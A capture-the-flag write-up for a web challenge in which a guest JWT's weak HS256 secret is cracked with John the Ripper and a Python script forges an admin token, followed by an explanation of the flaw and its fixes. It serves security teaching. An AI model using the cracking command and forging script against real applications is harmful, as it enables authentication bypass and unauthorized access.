# JWT — Weak Secret & Token Forgery

## Category
Web

## Difficulty
Medium

---

## Description

sono sharingan .... omae wa doko made mieteiru ?

The application uses **JWT (JSON Web Tokens)** to manage authentication.
Only the `admin` user can access the secret files.

![Challenge description and points](/Web/assets/jwt_chall.png)

---

## Initial Observation

Visiting the website shows the **Titan Gateways** page.
We are welcomed as a **guest**, with a message indicating restricted access.

![Guest view](guest.png)

Inspecting the browser storage reveals a cookie named `auth_token`.

![JWT cookie](cookie.png)

This cookie contains what appears to be a JWT.

---

## Step 1 — Extract the JWT

We copy the value of the `auth_token` cookie and save it into a file:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJpYXQiOjE3NzAwMzkwODQsImV4cCI6MTc3MDA0MjY4NH0.5jWx3Htad81L_c96rm7j4KqJ8f0pxh4twfaCgD39G1Q" > jwt.txt
```

The token uses the `HS256` algorithm, meaning it is signed using a **shared secret**.

---

## Step 2 — Cracking the JWT Secret

Since the application relies on a symmetric key, we attempt to crack the secret
using **John the Ripper** and the `rockyou.txt` wordlist:

```bash
john jwt.txt --format=HMAC-SHA256 --wordlist=~/Downloads/rockyou.txt
```

The secret is successfully cracked:

```
naruto
```

![Cracking the JWT](crack.png)

---

## Step 3 — Forging an Admin Token

Now that we know the secret key, we can forge a new JWT with elevated privileges.

We create the following Python script:

```python
import jwt
import datetime

# The secret found by John the Ripper
SECRET = "naruto"

# Crafting the admin payload
payload = {
    "user": "admin",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(hours=24)).timestamp())
}

# Sign it with the cracked secret
forged_token = jwt.encode(payload, SECRET, algorithm="HS256")

print("\n" + "="*50)
print("FORGED ADMIN TOKEN")
print("="*50)
print(forged_token)
print("="*50 + "\n")
```

Running this script outputs a **valid admin JWT**.

---

## Step 4 — Gaining Admin Access

We replace the value of the `auth_token` cookie in the browser with the forged token
and refresh the page.

![Admin access](admin_flag.png)

The application now recognizes us as `admin` and reveals the flag.

---

## Flag

```
Securinets{JWT_CR4CK1NG_r3allyyy_d4ng3r0us}
```

---

## Behind the Scenes (Explanation)

The backend signs JWTs using a **weak, guessable secret**:

```python
SECRET_KEY = "naruto"
```

Because the application:
- Uses `HS256` (symmetric signing)
- Stores authorization data (`user`) inside the token
- Does not rotate or protect the secret key

An attacker can:
1. Extract the JWT from cookies
2. Crack the secret using a wordlist
3. Forge a new token with `user = admin`
4. Gain full access

Using strong secrets, asymmetric algorithms (RS256),
and server-side authorization checks would prevent this attack.

---

## Conclusion

This challenge demonstrates the dangers of:
- Weak JWT secrets
- Trusting client-side tokens for authorization

Key takeaways:
- JWTs are not encrypted, only signed
- HS256 secrets must be strong and unguessable
- Never trust roles embedded in tokens without verification

A classic and realistic JWT security pitfall 🔥
